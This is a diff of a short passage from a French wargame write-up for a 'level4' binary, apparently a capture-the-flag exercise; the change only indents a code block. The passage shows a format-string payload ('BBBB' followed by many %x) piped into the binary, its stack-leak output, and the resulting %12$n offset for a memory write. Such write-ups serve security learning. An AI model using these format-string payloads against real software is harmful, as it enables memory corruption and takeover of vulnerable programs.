@@ -37,8 +37,8 @@ https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=1025544
 
 **Trouver la position de notre buffer dans la pile**
 
-echo "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
-BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
+    echo "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
+    BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
 
 `BBBB` apparaît en 12e position cette fois (l'appel imbriqué `n()` → `p()` ajoute des niveaux de pile en plus par rapport à level3). Donc `%12$n`.
 
